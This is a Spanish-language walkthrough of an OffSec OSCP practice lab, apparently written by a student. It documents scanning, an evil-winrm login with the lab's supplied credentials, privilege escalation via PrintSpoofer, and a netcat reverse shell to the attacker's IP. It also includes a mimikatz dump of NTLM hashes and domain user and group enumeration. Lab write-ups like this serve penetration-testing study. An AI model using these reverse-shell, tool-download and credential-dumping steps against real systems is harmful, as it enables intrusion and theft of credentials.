# Challenges: OSCP-B

## Fecha: 14/08/2025

## Objetivo

This is the second of three dedicated OSCP Challenge Labs. It is composed of six six OSCP+ machines. 
The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP+ exam.

The challenge contains three machines that are connected via Active Directory, and another three standalone machines that do not have any dependencies or intranet connections. 
All of the standalone machines have a local.txt and a proof.txt flag, however the Active Directory set only has a proof.txt on the Domain Controller. 
While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. 
The Active Directory set is worth 40 points all together.

To align with the OSCP+ 'Assumed Breach' scenario for the Active Directory portion of the exam, 
please use the credentials below for initial access: 

**Username**: Eric.Wallows 
**Password**: EricLikesRunning800

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in PEN-200 Challenge Labs 1-3. 
However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. 
You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP+ exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. 
While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. 
Thus, we explicitly do not recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. 
When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

Good luck!


## AD-Machines 

1. Reconocimiento **DMZ**

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
└─# nmap -A 192.168.116.147 -oN 147-result.txt                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 11:26 -03
Nmap scan report for 192.168.116.147
Host is up (0.16s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:                                                                                                                                                                                                       
|_  SYST: Windows_NT                                                                                                                                                                                              
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)                                                                                                                                               
| ssh-hostkey:                                                                                                                                                                                                    
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)                                                                                                                                                    
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)                                                                                                                                                   
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)                                                                                                                                                 
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                                                                                
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                        
445/tcp  open  microsoft-ds?                                                                                                                                                                                      
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                              
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                                       
|_http-title: Not Found                                                                                                                                                                                           
8000/tcp open  http          Microsoft IIS httpd 10.0                                                                                                                                                             
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                                          
|_http-title: IIS Windows                                                                                                                                                                                         
|_http-open-proxy: Proxy might be redirecting requests                                                                                                                                                            
| http-methods:                                                                                                                                                                                                   
|_  Potentially risky methods: TRACE                                                                                                                                                                              
8080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                              
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                                       
|_http-title: Bad Request                                                                                                                                                                                         
8443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                              
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                                       
| ssl-cert: Subject: commonName=MS01.oscp.exam                                                                                                                                                                    
| Subject Alternative Name: DNS:MS01.oscp.exam
| Not valid before: 2022-11-11T07:04:43
|_Not valid after:  2023-11-10T00:00:00
| tls-alpn: 
|_  http/1.1
|_http-title: Bad Request
|_ssl-date: 2025-08-14T14:29:49+00:00; -2s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/14%OT=21%CT=1%CU=44562%PV=Y%DS=4%DC=T%G=Y%TM=689DF2E
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=I%CI=I%TS=U)SEQ(SP=1
OS:07%GCD=1%ISR=10C%TI=I%CI=I%TS=U)SEQ(SP=108%GCD=1%ISR=10D%TI=I%CI=I%TS=U)
OS:SEQ(SP=FE%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=FF%GCD=1%ISR=10B%TI=I%CI=I
OS:%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW
OS:8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
OS:R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-14T14:29:44
|_  start_date: N/A
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   211.82 ms 192.168.45.1
2   211.61 ms 192.168.45.254
3   211.65 ms 192.168.251.1
4   211.85 ms 192.168.116.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.61 seconds

```
### Tabla de puertos y servicios — 192.168.xxx.147

| Puerto   | Estado | Servicio     | Versión / Información adicional                      |
| -------- | ------ | ------------ | ---------------------------------------------------- |
| 21/tcp   | open   | ftp          | Microsoft ftpd                                       |
| 22/tcp   | open   | ssh          | OpenSSH for\_Windows\_8.1 (protocol 2.0)             |
| 135/tcp  | open   | msrpc        | Microsoft Windows RPC                                |
| 139/tcp  | open   | netbios-ssn  | Microsoft Windows netbios-ssn                        |
| 445/tcp  | open   | microsoft-ds | (posible SMB / Windows share)                        |
| 5985/tcp | open   | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)              |
| 8000/tcp | open   | http         | Microsoft IIS httpd 10.0                             |
| 8080/tcp | open   | http         | Microsoft HTTPAPI httpd 2.0                          |
| 8443/tcp | open   | ssl/http     | Microsoft HTTPAPI httpd 2.0 - Cert CN=MS01.oscp.exam |


2. Enumerando **MS01**

```powershell
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/5_OSCP-B]
└─# evil-winrm -i 192.168.116.147 -u 'Eric.Wallows' -p 'EricLikesRunning800' -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
oscp\eric.wallows S-1-5-21-2610934713-1581164095-2706428072-7102


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> Get-Service -Name spooler

Status   Name               DisplayName
------   ----               -----------
Running  spooler            Print Spooler

*Evil-WinRM* PS C:\Users\eric.wallows\Documents> iwr -uri http://192.168.45.152:8000/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> iwr -uri http://192.168.45.152:8000/nc.exe -Outfile nc.exe
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> dir


    Directory: C:\Users\eric.wallows\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/14/2025   6:26 AM          59392 nc.exe
-a----         8/14/2025   6:26 AM          27136 PrintSpoofer.exe


*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\PrintSpoofer.exe -c "C:\Users\eric.wallows\Documents\nc.exe 192.168.45.152 4444 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> 
```

* En el receptor:

```bash
┌──(kali㉿kali)-[~/OffSec/Challenges/5_OSCP-B]
└─$ nc -lvnp 4444   
listening on [any] 4444 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.116.147] 62537
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Users\eric.wallows\Documents>.\mimikatz.exe
.\mimikatz.exe                                                                                                                                                                                                    
                                                                                                                                                                                                                  
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08                                                                                                                                                      
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                                                                                       
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                                                                                          
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                                                                                                                                                           
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                                                                                         
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/                                                                                                                                         
                                                                                                                                                                                                                  
mimikatz # privilege::debug                                                                                                                                                                                       
Privilege '20' OK                                                                                                                                                                                                 
                                                                                                                                                                                                                  
mimikatz # sekurlsa::logonpasswords                                                                                                                                                                               
                                                                                                                                                                                                                  
Authentication Id : 0 ; 563946 (00000000:00089aea)                                                                                                                                                                
Session           : Batch from 0                                                                                                                                                                                  
User Name         : Administrator                                                                                                                                                                                 
Domain            : MS01                                                                                                                                                                                          
Logon Server      : MS01                                                                                                                                                                                          
Logon Time        : 2/12/2025 2:59:59 PM                                                                                                                                                                          
SID               : S-1-5-21-2114389728-3978811169-1968162427-500                                                                                                                                                 
        msv :                                                                                                                                                                                                     
         [00000003] Primary                                                                                                                                                                                       
         * Username : Administrator                                                                                                                                                                               
         * Domain   : MS01                                                                                                                                                                                        
         * NTLM     : 3c4495bbd678fac8c9d218be4f2bbc7b                                                                                                                                                            
         * SHA1     : 90afa30798b082c0d0aae85435421502c254d459                                                                                                                                                    
        tspkg :                                                                                                                                                                                                   
        wdigest :                                                                                                                                                                                                 
         * Username : Administrator                                                                                                                                                                               
         * Domain   : MS01                                                                                                                                                                                        
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : MS01
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/12/2025 2:57:49 PM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/12/2025 2:57:47 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 77315 (00000000:00012e03)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 2:57:47 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : cc347a164e1bf1a36e2c0552dae0003e
         * SHA1     : bfdacb7592df08a3ac5245fe004685bf53441cf6
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : a8 8f 03 0f 1b 9a 75 c7 94 10 5d 36 e7 56 34 3b 89 6c 35 68 50 94 53 7c 4a 60 db ec eb fa 56 ed 2f 36 88 b0 b2 2f 10 8e 11 b6 be 10 7f d4 f2 b5 39 cd 0b b4 dc 4e e5 57 c0 ae 17 cc 7b ab 73 19 39 45 4e a9 8c c6 de 67 84 ce 45 09 bb e3 3c 3c 4f af 8c ff c9 40 a1 96 6a b8 e2 8d c0 69 12 e7 e7 87 ce 1a 5b 38 b2 f0 11 40 fa 4e 34 8e 1d 33 6e d3 c4 5e 91 c7 83 df be dd 45 30 a7 3f f5 29 b2 51 02 25 c4 67 79 c9 5d 7b 90 c9 3a c7 fd 89 1e 23 05 8e 31 cc 4e 9f 7d 8e cb 10 e0 1b 81 58 50 df 29 26 d4 73 4b 93 cf 9d a7 55 7d 53 57 a9 c9 08 96 93 2d 65 82 88 04 d5 14 fe ac 0e d7 a3 9c c2 0e 63 a6 ed a3 bb 83 97 f7 a3 08 68 0d 4c b7 77 77 0a 3e 85 26 15 ff 92 b8 8a 00 26 c2 b4 f2 d5 25 bd 8e d4 f7 74 39 2e 78 27 e7 26 20 0e 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 77288 (00000000:00012de8)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 2:57:47 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : 6771626ed4fd908a56116138bb0673c4
         * SHA1     : f36ea89591434979d77bdb1b06daf529969fcfee
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 09 44 07 04 ed f6 d7 75 c8 71 66 27 4c 37 5d 22 3f 3b 31 34 0c 15 d9 31 57 c1 c4 bd dc 1e ed 7e 4c 61 f0 4b af 75 00 f8 49 d2 3f c9 bf 4e 0e 27 7a e1 87 38 29 81 f4 62 99 29 72 40 10 18 46 77 fd ab f2 9b c1 19 b0 98 96 b9 e9 e1 af be b1 27 dd 34 df 4b 14 a8 e0 27 90 aa 4f 39 04 55 82 5e 7e 84 cb 04 f0 6f 24 76 1b b5 74 e2 34 93 1a ca ae 95 e4 f1 40 de 97 f0 fc 2e e3 c6 f7 27 5f a0 fb c6 52 a5 b2 35 7e 97 9e b2 ef 66 17 dd 89 01 f1 8c 8c f1 0b da 9b 3a 60 fd 09 31 4f 89 a3 92 ef 57 d5 15 55 26 07 a3 19 b3 f6 9d f0 41 67 ab dd 30 1c 4a 11 eb 41 af 8a a2 51 4d 6c 6b ba 52 5c fb 65 3e b5 26 bd 55 1a 50 87 be da f3 01 1e ef 44 29 da f7 83 23 53 86 69 d9 db 01 10 35 9f 3b 84 1b 13 b1 ab f3 6e f9 29 2e cd e0 5c 44 f0 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 2:57:47 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : 6771626ed4fd908a56116138bb0673c4
         * SHA1     : f36ea89591434979d77bdb1b06daf529969fcfee
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : ms01$
         * Domain   : OSCP.EXAM
         * Password : 09 44 07 04 ed f6 d7 75 c8 71 66 27 4c 37 5d 22 3f 3b 31 34 0c 15 d9 31 57 c1 c4 bd dc 1e ed 7e 4c 61 f0 4b af 75 00 f8 49 d2 3f c9 bf 4e 0e 27 7a e1 87 38 29 81 f4 62 99 29 72 40 10 18 46 77 fd ab f2 9b c1 19 b0 98 96 b9 e9 e1 af be b1 27 dd 34 df 4b 14 a8 e0 27 90 aa 4f 39 04 55 82 5e 7e 84 cb 04 f0 6f 24 76 1b b5 74 e2 34 93 1a ca ae 95 e4 f1 40 de 97 f0 fc 2e e3 c6 f7 27 5f a0 fb c6 52 a5 b2 35 7e 97 9e b2 ef 66 17 dd 89 01 f1 8c 8c f1 0b da 9b 3a 60 fd 09 31 4f 89 a3 92 ef 57 d5 15 55 26 07 a3 19 b3 f6 9d f0 41 67 ab dd 30 1c 4a 11 eb 41 af 8a a2 51 4d 6c 6b ba 52 5c fb 65 3e b5 26 bd 55 1a 50 87 be da f3 01 1e ef 44 29 da f7 83 23 53 86 69 d9 db 01 10 35 9f 3b 84 1b 13 b1 ab f3 6e f9 29 2e cd e0 5c 44 f0 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 47630 (00000000:0000ba0e)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 2:57:47 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : 6771626ed4fd908a56116138bb0673c4
         * SHA1     : f36ea89591434979d77bdb1b06daf529969fcfee
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 09 44 07 04 ed f6 d7 75 c8 71 66 27 4c 37 5d 22 3f 3b 31 34 0c 15 d9 31 57 c1 c4 bd dc 1e ed 7e 4c 61 f0 4b af 75 00 f8 49 d2 3f c9 bf 4e 0e 27 7a e1 87 38 29 81 f4 62 99 29 72 40 10 18 46 77 fd ab f2 9b c1 19 b0 98 96 b9 e9 e1 af be b1 27 dd 34 df 4b 14 a8 e0 27 90 aa 4f 39 04 55 82 5e 7e 84 cb 04 f0 6f 24 76 1b b5 74 e2 34 93 1a ca ae 95 e4 f1 40 de 97 f0 fc 2e e3 c6 f7 27 5f a0 fb c6 52 a5 b2 35 7e 97 9e b2 ef 66 17 dd 89 01 f1 8c 8c f1 0b da 9b 3a 60 fd 09 31 4f 89 a3 92 ef 57 d5 15 55 26 07 a3 19 b3 f6 9d f0 41 67 ab dd 30 1c 4a 11 eb 41 af 8a a2 51 4d 6c 6b ba 52 5c fb 65 3e b5 26 bd 55 1a 50 87 be da f3 01 1e ef 44 29 da f7 83 23 53 86 69 d9 db 01 10 35 9f 3b 84 1b 13 b1 ab f3 6e f9 29 2e cd e0 5c 44 f0 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 47559 (00000000:0000b9c7)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 2:57:47 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : 6771626ed4fd908a56116138bb0673c4
         * SHA1     : f36ea89591434979d77bdb1b06daf529969fcfee
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 09 44 07 04 ed f6 d7 75 c8 71 66 27 4c 37 5d 22 3f 3b 31 34 0c 15 d9 31 57 c1 c4 bd dc 1e ed 7e 4c 61 f0 4b af 75 00 f8 49 d2 3f c9 bf 4e 0e 27 7a e1 87 38 29 81 f4 62 99 29 72 40 10 18 46 77 fd ab f2 9b c1 19 b0 98 96 b9 e9 e1 af be b1 27 dd 34 df 4b 14 a8 e0 27 90 aa 4f 39 04 55 82 5e 7e 84 cb 04 f0 6f 24 76 1b b5 74 e2 34 93 1a ca ae 95 e4 f1 40 de 97 f0 fc 2e e3 c6 f7 27 5f a0 fb c6 52 a5 b2 35 7e 97 9e b2 ef 66 17 dd 89 01 f1 8c 8c f1 0b da 9b 3a 60 fd 09 31 4f 89 a3 92 ef 57 d5 15 55 26 07 a3 19 b3 f6 9d f0 41 67 ab dd 30 1c 4a 11 eb 41 af 8a a2 51 4d 6c 6b ba 52 5c fb 65 3e b5 26 bd 55 1a 50 87 be da f3 01 1e ef 44 29 da f7 83 23 53 86 69 d9 db 01 10 35 9f 3b 84 1b 13 b1 ab f3 6e f9 29 2e cd e0 5c 44 f0 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 45752 (00000000:0000b2b8)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/12/2025 2:57:47 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : 6771626ed4fd908a56116138bb0673c4
         * SHA1     : f36ea89591434979d77bdb1b06daf529969fcfee
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 2:57:47 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : ms01$
         * Domain   : OSCP.EXAM
         * Password : 09 44 07 04 ed f6 d7 75 c8 71 66 27 4c 37 5d 22 3f 3b 31 34 0c 15 d9 31 57 c1 c4 bd dc 1e ed 7e 4c 61 f0 4b af 75 00 f8 49 d2 3f c9 bf 4e 0e 27 7a e1 87 38 29 81 f4 62 99 29 72 40 10 18 46 77 fd ab f2 9b c1 19 b0 98 96 b9 e9 e1 af be b1 27 dd 34 df 4b 14 a8 e0 27 90 aa 4f 39 04 55 82 5e 7e 84 cb 04 f0 6f 24 76 1b b5 74 e2 34 93 1a ca ae 95 e4 f1 40 de 97 f0 fc 2e e3 c6 f7 27 5f a0 fb c6 52 a5 b2 35 7e 97 9e b2 ef 66 17 dd 89 01 f1 8c 8c f1 0b da 9b 3a 60 fd 09 31 4f 89 a3 92 ef 57 d5 15 55 26 07 a3 19 b3 f6 9d f0 41 67 ab dd 30 1c 4a 11 eb 41 af 8a a2 51 4d 6c 6b ba 52 5c fb 65 3e b5 26 bd 55 1a 50 87 be da f3 01 1e ef 44 29 da f7 83 23 53 86 69 d9 db 01 10 35 9f 3b 84 1b 13 b1 ab f3 6e f9 29 2e cd e0 5c 44 f0 
        ssp :
        credman :
        cloudap :

mimikatz #
```

> Unico hash util **Administrator**

```bash
3c4495bbd678fac8c9d218be4f2bbc7b = December31
```

> Obtuve una lista de usuarios completa con **PowerView**

```bash
PS C:\Users\eric.wallows\Documents> Get-DomainUser | select samaccountname
Get-DomainUser | select samaccountname

samaccountname 
-------------- 
Administrator  
Guest          
krbtgt         
celia.almeda   
tom.kinney     
tom_admin      
Leonard.Morris 
Sandra.Craig   
Chelsea.Byrne  
Luke.Martin    
Donna.Johnson  
Lawrence.Kay   
Emily.Bishop   
Linda.Patel    
Jamie.Thomas   
Shane.Mitchell 
Frank.Farrell  
Jane.Booth     
Joan.North     
Carol.Webb     
Kenneth.Coles  
Oliver.Gray    
Georgina.Begum 
Aimee.Hunt     
Thomas.Robinson
Janice.Turner  
sql_svc        
john.dorian    
web_svc        
eric.wallows
```

* Usuarios de dominio

```powershell
PS C:\Windows\system32> net user /domain
net user /domain
The request will be processed at a domain controller for domain oscp.exam.


User accounts for \\DC01.oscp.exam

-------------------------------------------------------------------------------
Administrator            Aimee.Hunt               Carol.Webb               
celia.almeda             Chelsea.Byrne            Donna.Johnson            
Emily.Bishop             eric.wallows             Frank.Farrell            
Georgina.Begum           Guest                    Jamie.Thomas             
Jane.Booth               Janice.Turner            Joan.North               
john.dorian              Kenneth.Coles            krbtgt                   
Lawrence.Kay             Leonard.Morris           Linda.Patel              
Luke.Martin              Oliver.Gray              Sandra.Craig             
Shane.Mitchell           sql_svc                  Thomas.Robinson          
tom.kinney               tom_admin                web_svc                  
The command completed with one or more errors.

PS C:\Windows\system32> net user web_svc /domain
net user web_svc /domain
The request will be processed at a domain controller for domain oscp.exam.

User name                    web_svc
Full Name                    web_svc
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/11/2022 12:11:19 AM
Password expires             Never
Password changeable          11/12/2022 12:11:19 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/1/2022 4:08:56 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.

PS C:\Windows\system32> net user tom_admin /domain
net user tom_admin /domain
The request will be processed at a domain controller for domain oscp.exam.

User name                    tom_admin
Full Name                    Tom Admin
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/1/2022 10:30:56 AM
Password expires             Never
Password changeable          4/2/2022 10:30:56 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Domain Admins        
The command completed successfully.

```

* **Grupos**

```powershell

PS C:\Windows\system32> net group /domain
net group /domain                                                                                                                                                                                                 
The request will be processed at a domain controller for domain oscp.exam.                                                                                                                                        
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Group Accounts for \\DC01.oscp.exam                                                                                                                                                                               
                                                                                                                                                                                                                  
-------------------------------------------------------------------------------                                                                                                                                   
*admin                                                                                                                                                                                                            
*Cloneable Domain Controllers                                                                                                                                                                                     
*DnsUpdateProxy                                                                                                                                                                                                   
*Domain Admins                                                                                                                                                                                                    
*Domain Computers                                                                                                                                                                                                 
*Domain Controllers                                                                                                                                                                                               
*Domain Guests                                                                                                                                                                                                    
*Domain Users                                                                                                                                                                                                     
*Enterprise Admins                                                                                                                                                                                                
*Enterprise Key Admins                                                                                                                                                                                            
*Enterprise Read-only Domain Controllers                                                                                                                                                                          
*finance                                                                                                                                                                                                          
*Group Policy Creator Owners                                                                                                                                                                                      
*hr                                                                                                                                                                                                               
*IT                                                                                                                                                                                                               
*Key Admins                                                                                                                                                                                                       
*marketing                                                                                                                                                                                                        
*Protected Users                                                                                                                                                                                                  
*Read-only Domain Controllers                                                                                                                                                                                     
*Schema Admins                                                                                                                                                                                                    
The command completed with one or more errors.
```

- Miembros:

```powershell
PS C:\Windows\system32> net group "marketing" /domain                                                                                                                                                             
net group "marketing" /domain                                                                                                                                                                                     
The request will be processed at a domain controller for domain oscp.exam.                                                                                                                                        
                                                                                                                                                                                                                  
Group name     marketing                                                                                                                                                                                          
Comment                                                                                                                                                                                                           
                                                                                                                                                                                                                  
Members                                                                                                                                                                                                        
                                                                                                                                                                                  
-------------------------------------------------------------------------------
Aimee.Hunt               Georgina.Begum           Janice.Turner                                                                                                                                                   
Thomas.Robinson                                                                                                                                                                                                   
The command completed successfully.                                                                                                                                                                               
                                                                                                                                                                                                                  
PS C:\Windows\system32> net group "admin" /domain                                                                                                                                                                 
net group "admin" /domain                                                                                                                                                                                         
The request will be processed at a domain controller for domain oscp.exam.

Group name     admin
Comment        

Members

-------------------------------------------------------------------------------
Chelsea.Byrne            Donna.Johnson            Leonard.Morris           
Luke.Martin              Sandra.Craig             
The command completed successfully.

PS C:\Windows\system32> net group "IT" /domain
net group "IT" /domain                                                                                                                                                                                            
The request will be processed at a domain controller for domain oscp.exam.                                                                                                                                        
                                                                                                                                                                                                                  
Group name     IT                                                                                                                                                                                                 
Comment                                                                                                                                                                                                           
                                                                                                                                                                                                                  
Members

-------------------------------------------------------------------------------
Carol.Webb               Kenneth.Coles            Oliver.Gray              
The command completed successfully.

PS C:\Windows\system32> net group "hr" /domain
net group "hr" /domain                                                                                                                                                                                            
The request will be processed at a domain controller for domain oscp.exam.                                                                                                                                        
                                                                                                                                                                                                                  
